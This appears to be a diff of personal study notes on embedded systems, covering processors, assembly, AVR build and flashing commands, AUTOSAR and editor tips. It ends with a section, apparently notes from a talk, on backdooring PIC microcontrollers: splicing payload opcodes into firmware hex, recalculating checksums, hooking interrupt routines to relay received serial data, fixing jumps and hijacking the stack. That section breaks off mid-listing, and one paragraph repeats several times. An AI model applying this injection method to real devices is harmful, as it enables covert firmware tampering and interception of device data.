@@ -1,41 +1,4 @@
-embedded system
-an embedded system can be thought of as a computer hardare system having software embedded in it. it can be an independent system or it can be a part of a large system.
-three components of an embedded system
--hardware
--application software
--RTOS
-
-characteristics of an embedded system
--single functioned
-	an embedded system usually performs a specialized operation and does the same repeatedlu.
--tightly constrained
-	all computing systemes have constraints on design metrics, but those on an embedded system can be especially tight.
-	design metrics is a measure of an implementation;s features such as its cost, size, power, and performance. it must be of a sizee to fit on a signle chip, must perform fast enough to process data in real time and consume minimum power to extend battery life
--reactive and real time
-	many embedded systems must continually react to changes in the system's encironment and must compute certain reesults in real time without any delay
-	consider an example of a car cruise controller, it continually monitors and reeacts to speed and brake sensors. it must compute acceleration or deeaccelerations repeeatedly within a limited time, a delayede computation can result in failure to control of the car
--microprocessors based
-	it must be microprocessor or microcontroller based
--memory
-	it must have a memory, as its software usually embeds in ROM, it does not need any secondary memories in thee computer	
--connect
-	it must have connected peripherals to conneect inout and output devices
--HW SW systems
-	software is used for more features and flexibility
-	hardware is used for performance and security
-
-advantages:
--easily customizable
--low power consumption
--low cost
--enhanced performance
-
-disadvantages:
--high development effort
--larger time to market
-
-===
-processor is the hreat of an embedded system. it is the basic unit that takes inputs and produces an output after processing the data. 
+processor is the heart of an embedded system. it is the basic unit that takes inputs and produces an output after processing the data. 
 a processor has two essential units:
 -program flow control unit(CU)
 -execution unit(EU)
@@ -50,7 +13,7 @@ processors can be of the following cateegories
 -application specific instruction processor(ASIPs)
 -GPP cores or ASIP cores on either an application specific integratedd ciruit(ASIC) or a very large scale integration(VLSI) circuit
 
-a microprocessor is a signle VLSI chip having a CPU. In addidtion, it may also have other units such as coaches, floating point processing arithmetic unit, and pipelining units that help in faster processing of instructions
+a microprocessor is a signle VLSI chip having a CPU. In addidtion, it may also have other units such as caches, floating point processing arithmetic unit, and pipelining units that help in faster processing of instructions
 
 a microcontroller is a signle-chip VLSI unit. although having limited computational capabilities, possesses enhanceed input/output capability and a number of on-chip functionall units
 
@@ -79,7 +42,7 @@ computers have separate memory areas for program instructions and data using int
 
 ===
 Von-Neumann architecture:
--single memory to be shared bu both code and data
+-single memory to be shared for both code and data
 -processor needs to fetch code in a separate clock cycle and data in another clock cycle, so it requires two clock cycles
 -higher speed, thus less time consuming
 -simple in design
@@ -136,6 +99,29 @@ an assembler is a program that takes basic computer instructions(called as assem
 an assembler creates object code by translating assembly instruction mnemonics into opcodes, resolving symbolic namees to memory locations.
 
 Assembly language uses a mnemonic to represent each low level machine operation(opcode)
+
+# C complilation process
+- source.c -> preprocesser -> source.i
+  - #include
+  - #ifdef
+- source.i -> compiler -> source.s
+- source.s -> ASM -> source.o
+- source.0 -> linker -> source.o
+  - Static linker, Other .o file
+  - Dynamic linker,  .so, .dylib
+
+editor program
+|(myFile.asm)
+v
+asseembler program -> myFile.lst(list file, it lists all the opcodes and addresses as well as error that the asseemblers deteeected
+|(myFile.obj)
+v
+linker program <- other obj files
+|(myFile.abs) (.abs is called an absolute file)
+OH program( object to hex convrter, which creates a file with the extension"hex" that is ready to burn in to the ROM
+|
+v
+myFile.hex
 
 ===
 debugging tools
@@ -195,47 +181,7 @@ criteria for choosing microcontroller
 -amount of RAM and ROM on the chip
 -cost per unit
 
-===
-Assembly languages were developed to provide mnemonics or symbols for the machine level code instructions. Assembly language programs consist of mneemonics, thus theey should be translated into machine code. 
-A program that is responsible for this conversion is known as assembleer.
-Assembly language is oftern termed as a low-level language, because it directly works with the internal structuree of the CPU.
-To program in assembly language, a programmer must know all the registers of the CPU
 
-structure of assembly language
-an assembly language program is a series of statements, which are eitheer asseembly language instruction such as ADD and MOV, or statements called directives
-An intruction tells the CPU what to do, while a directive(also calleede pseudo-instructions) gives instruction to the assembler.
-for example, ADD and MOV instructions are commands which the CPU runs,
-	while ORG and END are assembler directives. the assembler places thee opcode to the memory location 0 when the ORG directive is used, while END indicates to the end of the source code.
-
-===
-[lable:] mnemonics [operands] [;comment]
-a square bracket[] indicates that the field is optional
-the label field allows the program to refer to a line of code by name. The label fields can not eexceed a certain number of characters
-the mnemonics and operands field together perform the real work of thee program and accomplish the tasks
-statemnts like AAD A, C & Move C,#68 wheere ADD and MOV are the mnemonics, which profuce opcodes; "A,C" and "C,#68" are operands. 
-these two fields could contain directives, directives do not generate machine code and are used only by the assembler, whereas instructions are translated into machine code for the CPU to execute
-the comment field begians wiith a semicolon which is comment indicator
-any label which refers to an instruction should be followed by a colon
-
-
-editor program
-|(myFile.asm)
-v
-asseembler program -> myFile.lst(list file, it lists all the opcodes and addresses as well as error that the asseemblers deteeected
-|(myFile.obj)
-v
-linker program <- other obj files
-|(myFile.abs) (.abs is called an absolute file)
-OH program( object to hex convrter, which creates a file with the extension"hex" that is ready to burn in to the ROM
-|
-v
-myFile.hex
-
-===
-the DB directive is the most widely used data direective in the asseembler. it is useed to define the 8 bit data
-it can also be used to define decimal, binary, hex, or ASCII formats data.
-For decimal, the "D" after the decimal number is optional, but is is required for "B"(binary) and "HI"(hexadecimal)
-to indicate ASCII, simply place the characteers in quotation marks("like this"). The Assembler generates ASCII code for the numbers/characters automatically.
 
 ===
 registers
@@ -364,65 +310,6 @@ it is also a device that counts down from a specifiedd time interval and used to
 a counter is a device that stores the number of times a particular event or process occurred, with respect to a clock signal.
 it is used to count the events happening outside the microcontroller.
 in electronics, counters can be impplemented quite easily using register-type circuits such as a flip-flop
-
-===
-an inteerrupt is a gisnal to the processor emiited by hardware or software indicating an event that needs immeediate attention
-wheneveer an interrupt occurs, the controller completees the execution of the current instruction and starts the execution of an Interrupt Service Routine(ISR) or interrupt handler
-ISR tells the processor or controller what to do when the interrupt occurs
-
-the state of continuoys monitoring is known as polling. the microcontroller keeps checking the status of other devices, and while doing so , it does not other operation and consumes all its processing time for moinitoring. this problem can be addressed by using interruptse
-
-interrupt modiles are of two types
--edge trigering
--leevel trigering
-
-
-===
-
-learndsPIC33EP64MC502
-
-capacitor 104 value, 0.1uF
-
-ceramic capacitor
-electrolytic capacitors
-	they are the only type of capacitor that is polarized
-	positive pin, the anode, the anode always needs to be connected to a higher voltage, longer pin
-	negative pin, cathode, shorter pin
-
-kilofarad kF 1000F
-milifarad mF 0.001F
-microfarad uF 0.000001F
-nanofarad nF 0.000000001F
-picofarad pF 0.000000000001F
-
-decoupling capacitor
-in intergrated circuit(IC), capacitors have a critical job to perform by remiving all of the high frequeency noise found in the power supply signals that power an IC
-any fluctuation in voltage can be fatal to an IC, and can even result in the chip powering off unexpectedly.
-By placing capacitors betweeen the IC and a power supply, they calm the voltage fluctuations and also as a second power source if the primary power drops its voltage enough to turn off an IC
-
-energy storage
-capacitors share many simiilar characteristics to batteries, including their ability to store energy. 
-However, unlike the battery, capacitors cant hold nearly as much poweer.
-but while they cant keep up in quantity, they make up for in their zest to discharge as quickly as possible
-capacitos can deliver energy way faster than a battery, which makes them the perfect fit for powering the flash in a camera, tuning a radio station, or switching the channels on a TV
-
-capacitive touch sensors
-one of the most recent advancements in capacitor applications has to do with thee explosion of touch screen technologies. 
-the glass screeens that make up these touch sensors ahve a very thin, transparent metal coating. when your finger touches the screen, this creates a voltage drop, identifying the exact location of your finger
-
-
-lab 16
-
-PIC from Mirochip
-AVR from Atmel
-8051 from Intel
-ARM from different manufacturers, like stm32
-
-master clear pin external reset
-MCLR is an optional reset is activated by pulling the pin low
-a small capacitor can be connected from the MCLR pin to ground to hold the device in reset mode longer wheen pulled low by a short signal
-a normally open momentary switch can also be added from MCLR to ground to offer a manual way to reset the device
-
 
 ===
 why PLL
@@ -1040,15 +927,6 @@ sample middle of data bits
 ASCII
 
 ========
-# debug
-- ARM cortex-M
-  SWD
-  Debug probe, STLink
-  USB
-  openOCD, on chip debug
-    GDB, the GNU debugger, comes with arm-none-eabi 
-
-========
 - MCU, microcontroller
   - CPU, RAM, flash storage and peripherals all on one chip
   - small, low power, low performance
@@ -1142,12 +1020,6 @@ phony target
 -to improve performance
 https://www.gnu.org/software/make/manual/html_node/Phony-Targets.html
 
-
-========
-- programming manual
-- processor technical reference manual
-- architecutre reference manual
-
 ========
 - BIOS is copied from ROM to RAM
 - BIOS initializes HW, runs power-on self test
@@ -1163,13 +1035,6 @@ https://www.gnu.org/software/make/manual/html_node/Phony-Targets.html
 - directive, gives a clue to the assembler that will affect how the program gets compoled. 
   - not tranlsted to machine code
 - instruction, translated to a machine code instruction that the CPU will execute
-
-======
-Linux
----
-less/more + file  viewing files
-tail/head + file to see the first/end couple of lines
-
 
 Arduino
 ---
@@ -1233,119 +1098,6 @@ tmux
 18.s show all the sessions
 19.d detach current session
 
-
-vim
-----
-1.:q quit
-  :wq save and quit
-  :q! quit without saving
-
-2.dd delete a line put number before detele certain amount of lines
-	D delete until the end
-  gg go to top
-  G go to the bottom
-
-3.j up
-  k down
-  l left
-  h right
-  } next blocks of code
-  { previous blocks of code
-4.undo u
-  redo control+ R
-
-5.copy   yy
-  paste  p below
-  		 P above
-
-6. visual mode v selct mutiple lines by using jklh
-	V select whole line 
-
-7. add a line and insert mode     o blew O above
-
-8.next word w
-  previous word b
-
-9.:+number to number line
-
-10.% {        }
-
-11.cw change a word
-
-12.dw delete a word
-
-13.dt delete until 
-
-14.* find all the reference 
-
-15.centor your cursor zz
-
-26.zz move the page with current line being in the middle
-
-27.zb move the page with current line being the last line
-
-28.yw copy a single word
-
-29.c$ delete all until the end of this line
-
-30.~ Capitalize letters
-
-31.A insert at the end of a line
-
-32.r to replace one signle letter
-
-33.A to insert at the end of a line
-
-34.I to insert in the begining of a line
-
-35.s delete a character and insert
-
-36.S delete a line and insert
-
-37.e jump to the end of a word
-
-38.dap delete a paragraph
-
-39.dab delete a bracket
-
-40.daw delete a word
-
-41.uses < and > to tab mulitple lines
-
-42. H M L use for high mid and low of the screen
-
-43. replace or delete text
-	:s/foo/bar/ replace first foo with bar
-	:%s/foo/bar/g replace all the foo with bar
-		without g, its gonna only affect the first occurence
-	:s/foo// delete all foo
-
-44. comment lines
-	:5,20s/^/#/
-	add # before the line from 5 to 20
-
-45. control + n/p for auto complete
-
-46. !ls to run bash command
-
-47. 0 to the start of a line 
-
-48. ^ start of a line
-
-49. :100,111s/^/hello/
-
-50. q + a make a recording, q again to end
-    and (number )@ + a do the recording x nmber of times
-
-51. norm Icall("
-    add in the start
-
-52. gx 
-
-53. search and cgn, change the next search hit and . to do the same for the next hit.
-
-54. g + i, jump to the last insert location
-
 ===
 grep is an acronym that stands for global regular expression print
 grep 'string to match' 'file name'
@@ -1355,3 +1107,1093 @@ grep 'string to match' 'file name'
 - grep commands are case sensitive use -i to ignore case in grep seaches
 - to include all subdirectories in a search, add the -r operator to the grep command
 - to list names of matching files, use -l
+
+OEM, original equipment manufacturers
+  - produces some original equipments
+  - their forus is on degisning, promoting, assembling cars and odering from vendors
+
+Tier 1, 2 and 3 suppliers
+- Tier 1 suppliers are companies that supply parts or systems directly to OEMs
+  - Tire 1 usualy work with a variety of car companies
+- Tier 2, supply parts that end up in carss, they dont directly sell to OEMs.
+  - they dont have the ability or desire to produce automotive-grade parts
+- Tier 3, rare, raw, close to raw materials, plasti or metal
+
+ECU, electronic control unit includes sensors, actuators, microcontrollers
+CAN network
+ 
+Microcontroller Abstraction Layer, MCAL
+  makes the BSW (basic software) 
+  and the application layer 
+  independent of the microcontroller
+
+- application layer
+- runtime environent
+- basic software
+  - services layer
+    - system
+    - memory
+    - communication
+    - crypto
+  - ECU abstraction layer
+    - system abstraction 
+    - memory abstraction 
+    - communication abstraction 
+    - crypto abstraction 
+  - microcontrolleer abstractioin layer
+  - complex drivers layer
+- microcontroller
+
+BSW modules:
+- operating system
+- access to non volatile memory
+- communicatioin via CAN, LIN, FlexRay and Ethernet
+- handling the diagnostics
+- access to I/O ports
+- systems services like ECU state management
+
+MCAL, microcontrolleer abstractioin layer
+- SW modules with direct access to the uC and internal peripherals
+- make higher SSW layers independent of uC
+- implementation: uC dependent
+  upper interface: standardized and uC independent
+
+ECU abstraction layer
+- interfaces the microcontrolleer abstractioin layer
+- implementationl: uC independent, ECU hardware dependent
+   Uper interfacae: uC and ECU hardware independent
+
+Complex drivers layer
+
+Services layer, mostly uC and ECU hardware independent
+
+RTE, AUTOSAR runtime environment
+- is a layer providing communication services to the application software, AUTOSAR SW components and/or AUTOSAR sensor/actuator components
+- make AUTOSAR SW components independent from the mapping to a specific ECU
+- implementation: ECU and application specific (geneerated individually for each ECU)
+  upper interface: completely ECU independent
+
+Application layer, OEM would pay for this
+
+================
+legacy CAN STACK architecture
+
+Application
+CAN STACK
+CAN DRIVER, hardware API
+CAN HAREWARE
+
+================
+AUTomotive Open System ARchitecture
+- application layer
+- runtime environment, RTE
+- basic software, BSW
+- microconroller
+
+========
+avrdude to upload and flash code to MCU
+-change fuse
+-upload code
+./avrdude
+avrdude -C ../etc/avrdude.conf -p atmega328p -c usbtiny -U lfuse:w:0xF2:m
+/applications/Arduino.app/Contents/java/hardware/tools/avr/bin
+notes: delay() in Arduino waits a certain amount of clock cycles. Changing the oscillator means changing the clock speed, thus it waits a diiferent amount of time.
+
+c code -> assembly -> machine code
+compiler, assembler
+
+avr-gcc -mmcu=atmega328p dummy.c
+hexdump a.out
+./a.out
+
+----
+text(code)
+----
+data(varible)
+----
+stack
+|
+V growth
+----
+free
+----
+^growth
+|
+heap
+----
+
+converts it to a hex file before upload
+avr-objcopy -O ihex -j .text -j .data a.out a.hex
+
+use avrdude to upload
+avrdude -C /usr/local/Cellar/avrdude/6.3_1/etc/avrdude.conf -v -p atmega328p -c usbtiny -U flash:w:a.hex
+
+avr-gcc compile C code to machine code
+avr-objcopy translate from raw binary to "intel hex" format
+avrdude upload machine code to thee microcontroller
+
+for my redboard 
+avrdude -C /usr/local/Cellar/avrdude/6.3_1/etc/avrdude.conf -v -p atmega328p -c stk500v1 -P /dev/tty.usbserial-DN02Z1QJ -U flash:w:/Users/chenshen/Desktop/FreeRTOS710-template-for-ATmega328P-master/main.hex -F
+
+preprocessor automated copy/paste
+its convention to write the keyword in ALL CAPS so other people recognize that you are using a preprocessor macro
+#define FIND replace
+
+linkers
+so there is no need to recompile each library everytime
+By default, avr-gcc runs the linker
+We can add rhe -c flag to ddo a compile only operation.
+
+avr-gcc -c -mmcu=<microcontroller> <sourceFile>
+generates .o file
+
+avr-gcc -mmcu=<microcontroller> <machineCode1><machineCode2><machineCode3>
+generates excutable file
+
+.h file for prototypes for functions
+avr-gcc -c ... stop after compile+assemble
+avr-gcc -E ... stop after preprocessor
+avr-gcc -S ... stop after compile
+
+example1:
+#idndef MITCHISCOOL
+#define MITCHISCOOL 1234
+void delay(long)
+...
+#endif
+
+example2:
+#ifnddef __TIMING_H__
+#define __TIMING_H__
+...
+#endif
+
+bit banging(bitwise operations)
+PORTB =PORTB|32 (turn one bit on)
+10001010
+00100000 or |
+10101010
+
+PORTB =PORTB&233 (turn one bit off)
+10101010
+11011111 and &
+10001010
+
+bit shifting
+PORTB =PORTB<<1
+
+PORTB |=(1<<5)
+10001010
+00100000 1<<5 or
+10101010
+
+PORTB &= ~(1<<5)
+10101010
+11011111 ~(1<<5) and
+10001010 
+
+bit banging(toggle)
+PORTB =PORTB^(1<<5)
+10101010
+00100000 xor
+10001010
+
+10001010
+00100000 xor
+10101010
+
+Turn PB5 on: PORTB |= (1<<5)
+Turn PB5 off: PORTB &= ~(1<<5)
+Toggle PB5: PORTB ^=(1<<5)
+
+----
+STM32
+HAL layer
+
+fake analog PWM pulse width modulation
+real analog DAC digital to analog converter
+
+duty cycle: percentage of time the pin is ON during the cycle
+resolution: the number that we count to. number of possible duty cycle settings
+frequency: the number of times we repeat the cycle per second
+
+example:
+system clock is 72MHZ -> we can count 72 million times each second
+8-bit resolution(0-255) -> each cycle is 256 counts
+the PWM frequency is 72 000 000 / 256 = 218250 cycles,218KHZ 
+
+anode positve
+cathode negative
+VSS voltage source GND
+VDD voltage drain
+
+---
+DDRAM:data display random access memory
+ it is the working data buffer of the display
+ each character on the display has a correspinding DDRAM location 
+ and the byte loadeed in DDRAM controls which character is displayed
+CGROM:characteer generation read only memory
+ holds all the standard patterens for 5*7 dor matrix characters
+CGRAM:character generation random access memory
+ allows the user to define speacial supplementary non-standard character types that are enot in the CGROM
+ you can load your own dot pattern shapes and call these up for display
+
+
+instructions to use a LCD display
+clear display
+return home
+entry mode set: set the moving direction of cursor and display
+display on, No cursor
+write data to screen
+
+bouncing occurs for switches, addding a capacitor could solve the problem
+
+avr-gcc -mmcu=atmega328p -c main.c
+avr-gcc -mmcu=atmega328p main.o FreeRTOS/Source/tasks.o FreeRTOS/Source/croutine.o FreeRTOS/Source/list.o FreeRTOS/Source/queue.o FreeRTOS/Source/timers.o FreeRTOS/Source/extras/comtest.o FreeRTOS/Source/portable/GCC/ATMega328/port.o  FreeRTOS/Source/portable/GCC/ATMega328/extras/serial.o  FreeRTOS/Source/portable/MemMang/heap_1.o -o main
+avr-objcopy -O ihex -j .text -j .data main main.hex
+avrdude -C /usr/local/Cellar/avrdude/6.3_1/etc/avrdude.conf -v -p atmega328p -c stk500v1 -P /dev/tty.usbserial-DN02Z1QJ -U flash:w:/Users/chenshen/Desktop/FreeRTOS710-template-for-ATmega328P-master/main.hex -F
+
+===
+interface, is the path for communication betweeen two components.
+interfacing is of two types, memory interfacing and I/O interfacing
+
+memory interfacing
+when we are executing any intruction, we need the microproceessor to access the memory for reading instruction codes and the data stored in the memory.
+for this, both the memory and the microprocessor requires some signals to read from and write to registers
+the intercaing process includes some key factors to match with the memory requirements and microprocessor signals. the interfacing circuit therefore should be designed in such a way that it matches thee memory signal requirements with the signals of the microprocessor
+
+IO interfacing
+there are various communication devices like the keyboard, mouse, printer, rtc. 
+we need to interface the keyboard and other devices with the micropressor byusing latches and buffers. this type of interfacing is known as IO interfacing
+
+serial communication interface
+	in this type of communication, the interface gets a signal byte of data from the microprocessor and sends it bit by bit to the other system serially and vice-a-versa
+parallel communication interface
+	in this type of communication, the interface gets a byte of data from the microprocessor and sends it bit by bit to the other systems in simultaneous or paralleel fashion and vice-a-versa
+===
+8051, it is an 8-bit microcontroller. it is built with 40 pins DIP(dual inline package), 4kb of ROM storage and 128 bytes of RAM storage, 2 16-bit timers. An on-chip verystal oscillator is intergrated in th microcontroller having crystal freequency of 12MHZ
+
+the system bus connects all the support devices to the CPU.
+the system bus consists of an 8-bit data bus, a 16-bit address bus and bus control signals. all other devices like program memory, ports, data emmory, serial interface, interrupt control, timers and the CPU are all interfaced together through the system bus
+
+Pin 29: PSEN, program store enable, it is used to read a signal from the external program memory
+Pin 30:EA, external access input, it is used to enable/disable the external memory interfacing
+Pin 31:ALE, address latch enable, it is used to demultiplex the address-ddare signal for port
+
+===
+assembling a program
+the host system and the tarfet system is different
+specify how to transform the source code into machine code, where to locate the machine code in the target system memory, how to load the program from the host system into the target system
+
+the final program that runs on the MCU target computer is called an executable program or simply an "executable"
+1. create an assembly progtram(.asm or .s)
+2. an assembler which converts the source code into a binary form suitable for the MCU(croess-assembler). The assembler generates an object file that hasa .o extension can contains what people call object code. 
+the object file is in a format called an ELF(extensible linking and format)/DWARF(is also a standard file fomat for the information generated bu compilers, assemblers and linkers) format, and in addition to machine code, it has a certain amount of overhead data
+3. the .o file created bu the assembler is an intermediate file that has the essential MCU machine language, but it still needs to be modified somewhat.
+for instance, it may need to be combined or linked with other object code files, such as library routines, to create the final profram that will actually run on the microcontroller. it may also need to resolve addresses which are not known unitl other files are linked with it.
+	the job of the linker is to create a complte machne code file that is almost ready to run on the MCU. the linker does this by filling in the unresolved addreesses and by linking related programs to create the final program.
+	the file created by the linker is called an absolute file and has a .abs file extension. the absolute file contains the executable machine code that will be used by the MCU, and it also has overhead information such as address assignments for the code, etc. the .abs file that we generate with the linker is sometimes called an executablee image since it has all the esstential machine code but doesnt yet sit on the target system. this executable image will be transferred to the MCU after one more transformation
+ the .abs file that we generate with the linker is sometimes called an executablee image since it has all the esstential machine code but doesnt yet sit on the target system. this executable image will be transferred to the MCU after one more transformation the .abs file that we generate with the linker is sometimes called an executablee image since it has all the esstential machine code but doesnt yet sit on the target system. this executable image will be transferred to the MCU after one more transformation the .abs file that we generate with the linker is sometimes called an executablee image since it has all the esstential machine code but doesnt yet sit on the target system. this executable image will be transferred to the MCU after one more transformation the .abs file that we generate with the linker is sometimes called an executablee image since it has all the esstential machine code but doesnt yet sit on the target system. this executable image will be transferred to the MCU after one more transformation
+4. in the next step, we convert the absolute .abs file into a form suitable for a loader to use.
+the loader is a program that will transfer the executable program from the host system to the target system. the loader requires that the executable machine code inforamtion in the .abs file be formatted in a ceratin way. we do this by converting the executablee machine code information in the .abs file into short chunks of code, called "S-records" by Motorola.
+each S-record is a line of text containing a header, the address where the machine code will be loaded, the machine code itself, and some extra checksum bits to make sure that the transfer was successful.
+the final program that we will download to the MCY consists of a bunch of these S-reords in one file which has a file exteenskon ".s1" or ".sx"
+5.finally, we must transfer the .s1 file from the host PC to the target MCU. this is done using a program called a loader. There are serveeral tyoes of loaders depending on the connection between the host system and the target system, and depending on the format of the file to be transferreed.
+
+===
+backdooring hardware devices by injecting malicious payloads on microcontrollers
+https://www.youtube.com/watch?v=s326a_HELuw&ab_channel=HackersOnBoard
+
+mircroprocessors, Intel, AMD, ARM
+microcontrollers, microchip, ATMEL, ST
+
+microprocessors overview
+- microprocessors = CPU
+- memories and I/O busses are physically separated
+- usually bigger than a microcontroller
+- greater processing capacity
+- input -> microprocessor(ALU, registers, etc) -> output
+								^
+								|
+								v	
+							memory	
+- modified-harvard memory organization
+- 32 or 64 bits(most common)	
+
+mircrocontrollers overview
+- microcontrollers = CPU + RAM + ROM + I/O busses
+- smaller CPU with less processing capacity
+- usually smaller size than microprecessors
+- CPU, internal oscillator, RAM, ROM, peripherals, I/O busses, others
+- harvard memory organizatiojn
+- 16 bits (most common)
+- a little stack
+
+Raspberry PI, ARM microprocessor
+Arduino UNO, atmega microcontroller
+
+microcontrollers programming
+user -> 		C file						hex file	
+|							|									|
+v							v									V
+ASM file <- compiler					programmer software
+|																|
+v																v
+assembler -> hex file					programmer hardware => uC
+
+PIC program memory dump
+- program memory, non-volatile
+- data memory (RAM), SFR(special function registers), GPR (general purpose registers), volatile
+- data flash/ EEPROM memoty (ROM), non-volatile
+
+PIC program standard structure
+# include files
+PIC config directives
+program constants
+RAM variables
+resert vector 0x0000; goto start, reset vector: always at 0x0000 memory address
+interrupt vector 0x0008, interrupt vector: at 0x0008 and 0x0018 memory address
+	interrupt routine #1
+	interrupt routine #2
+start: , program entry pointo
+	program main code
+	
+ASM source code:
+REST_VECT CODE 0x0000
+	GOTO START
+
+; TODO add interrupts here is used
+
+MIAN_PROG CODE
+
+START
+	CLRF PORTD	; clear PORTD
+	MOVLw B'00000000'
+	MOVWF TRISD ; set all to output
+
+	BSF PORTS,2	; turn on LED
+	GOTO $	; loop forever
+
+END
+
+disassembly:
+line address opcode disassembly
+1			0000		EF03	GTO 0x6
+2			0002		F000	NOP
+3 		0004		0000	NOP
+4			0006		6A83	CLRF PORTD,access
+5			0008		0E00	MOVLW 0x0
+6 		000A		6E95	MOVWF TRISD, access
+7			000C		8483	BSF PORTD, 2, access
+8			000E		EF07	GOTO 0xE
+9 		0010		F000	NOP
+* access word, data access memeory is performed, because PORTD and TRISD are SFR located at RAM
+
+opcodes in the .hex dump
+: 020000040000FA
+: 1000000003EF00F00000836A000E956E838407EF13
+: 1000100000FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFE
+: 10002000FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFE0
+: 10003000FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFD0
+* match the assembly instructiuon in opcodes, however, they are inverted, because of the little endian format to store bits in memory
+* entry point: 0x06, memory address to inject
+
+generating the payload, malicious
+BCF TRISD,1 // set pin as output
+BSF PORTD,1 // turn on a LED
+BCF TRISD,2 // set pin as output
+BSF PORTD,2 // turn on a LED
+* use the specific assembly instruction set for the target device
+* in order to get the opcode, writing all the assembly instructions of the payload in an assembly file inside MP lab IDE and then compile it to get the disassembly view and get the opcodes
+
+0000 NOP
+9295 BCF TRISD, 1, access
+8283 BSF PORTD, 1, access
+9495 BCF TRISD, 2, access
+8243 BSF PORTD, 2, access
+0000 NOP
+Little Endian: 0x9592 0x8382 0x9594 0x8384
+
+exmaple, entry point at 0x28
+line address opcode disassembly
+1			0000		EF14	GOTO 0x28
+2			0002		F000	NOP
+3			0004		0000	NOP
+
+original program memory(.hex dump)
+: 02 00 00 04 00 00 FA
+: 10 00 00 00 14 EF 00 F0 00 00 0E 0E 04 6E 48 0E 07 6E 50 0E 46
+: 10 00 10 00 09 6E 04 00 09 2E 0A EF 00 F0 07 2E 07 EF 00 F0 2A
+: 10 00 20 00 04 2E 05 EF 00 F0 00 0C 00 0E 95 6E 83 8C 03 EC 9F
+: 10 00 30 00 00 F0 83 9C 03 EC 00 F0 16 EF 00 F0 FF FF FF FF E1
+* 0C is the entry point offset
+* end of every line, there is a checksum, 46, 2A, 9F, E1
+
+payload injected at entry point (ox28)
+: 02 00 00 04 00 00 FA
+: 10 00 00 00 14 EF 00 F0 00 00 0E 0E 04 6E 48 0E 07 6E 50 0E 46
+: 10 00 10 00 09 6E 04 00 09 2E 0A EF OO F0 07 2E 07 EF 00 F0 2A
+: 10 00 20 00 04 2E 05 EF 00 F0 00 0C 95 92 83 82 95 94 83 84 9F
+: 10 00 30 00 00 0E 95 6E 83 8C 03 EC 00 F0 83 9C 03 EC 00 FD E1
+: 10 00 40 00 16 EF 00 F0 FF FF FF FF FF FF FF FF FF FF FF FF C0
+* need to recaluculate the checksum
+
+checksum recalculation
+- Sum(bytes on the line) = Not + 1 = checksum
+- exmaple: :1000000003EF00F00000959E838E836A000E956E
+	10 + 00 + 00 + 00 + 03 + EF + 00 + F0 + 00 + 00 + 95 + 9E + 83 + 8E + 83 + 6A + 00 + OE + 95 + 6E = Ox634
+	Not(0x634) +1 = 0xFFFF 0xFFFF 0xFFFF 0xF9CC
+	checksum = 0xCC
+
+paylay injected and checksum fiexed
+: 02 00 00 04 00 00 FA
+: 10 00 00 00 14 EF 00 F0 00 00 0E 0E 04 6E 48 0E 07 6E 50 0E 46
+: 10 00 10 00 09 6E 04 00 09 2E 0A EF OO F0 07 2E 07 EF 00 F0 2A
+: 10 00 20 00 04 2E 05 EF 00 F0 00 0C 95 92 83 82 95 94 83 84 52
+: 10 00 30 00 00 0E 95 6E 83 8C 03 EC 00 F0 83 9C 03 EC 00 FD C3
+: 10 00 40 00 16 EF 00 F0 FF FF FF FF FF FF FF FF FF FF FF FF C7
+
+INTCON, a readable and writeable register which contains the various enablee bits for all interrupt sources
+GIE EEIE TMR0IE INT0IR RBIE TMR0IF TMR0IF INT0IF RBIF
+- interruptions enabled
+	BSF INTCON, GIE
+	BSF INTCON, EEIE
+- GIE, the flobal interrupt enable bit
+	EEIE, EE wrtie complete interrupt enable bit
+  TMR0IE, timer0 interruption enabled
+	TMR0IF, timer0 interruption flag
+- multiple peripheral interrupt enable registers (PIE1, PIE2)	
+	they have interruption enabling bits and interruption flags bits
+
+example:
+	address opcode disassembly
+	000E		BA9E		BTFSC PIR1, 5, access
+	0010		EC24		CALl 0x48, 0
+
+	* bit 5 in PIR1 (peripheral interrupt request) is RCIF
+	* communication peripherals when the microcontrollers receives datafrom any communication protocol it wil trigger an interruption that will set this specific flag to one.
+	* if this flag is to one, the call will be executed jumping to a core routine located at 0x48	
+
+	cook a payload that makes a relaying of the received data to a TX peripheral which we are able to monitor externally
+	MOVF RCREG, W //move the received data to W register
+	BSF	TXSTA, TXEN	// enable transmission
+	BCF TXSTA, SYNC // set asynchronous operation
+	BSF RCSTA, SPEN // set TX/CK pin as an output
+	MOVWF TXREG	// move received data(in W) to TXREG to be re-transmitted
+	opcode:
+	50AE
+	8AAC
+	98AC
+	8EAB
+	6EAD
+	with little endian: AE50AC8AAC98AB8EAD6E
+
+example:
+address opcode disassembly
+0014		B4F2		BTFSC INTCON, 2, access
+0016		EC27		CALl 0x4E, 0
+0018		F000		NOP
+001A		BC9E		BTFSC PIR1, 6, access
+001C		EC2B		CALl 0x56, 0 
+001E 		F000		NOP
+0020		B2F2		BTFSC INTCON, 1, access
+0022 		EC2B		CALl 0x5E, 0
+0024		F000		NOP
+
+- 0x48 to inject a payload at the RC interruption
+- 0x4E to inject a payload at timer0 interruption
+- 0x56 to inject a payload at the AD interruption
+- 0x5E to inject a payload at the INT0 interruption
+
+fixing jumps, flow corruption
+call 0x10, and 0x10 is changed after payload injection
+
+GOTO opcode 0xEF
+CALl opcode 0XEC
+NOP opcode 0xF0
+* in PIC18 microcontrollers, the assembly instructions are 16 bits in length
+* 8 bits are used for the opcode and 8 bits for the memory address to jump or goto
+* but 2 more bytes are reserved in case of needing jumo in more than 2255 positions.
+EF06 F000 = GOTO jumping to 0x0006 offst (0x000C = 0x0006 * 2 memory address)
+EC67 F004 = CALl jumping to 0x467 offset (0x08CE = 0x0476 * 2 memory address)
+
+fixing jump, recalculation
+payload injected at memoty address: 0x48
+paylaod length: 10 bytes
+emample:
+	call 0x56 (EC2B F000) -> original jump
+	call 0x60 (EC30 F000) -> fixed jump, original offset + payload length
+	10 bytes = 80 bits = 10 memeory address, 10 /2 = 5. 2B + 5 = 30
+
+stack payload injection, controlling program flow
+STKPTR, stack pointer register
+TOSU, TOSh, TOSL, top of stack registers
+
+top of stack 001A34h 00010
+						 000D58h 00001
+TOSU 00h, TOSH 1Ah, TOSL 34h
+stack pointer STKPTR 00010 <4:0>
+
+INCF STKPTR, F //SP increment
+MOVLW 0x00
+MOVWF TOSU // TOSU = 0x00
+MOVLW 0x0C
+MOVWF TOSH // TOSH = 0x0C
+MOVLW 0x72
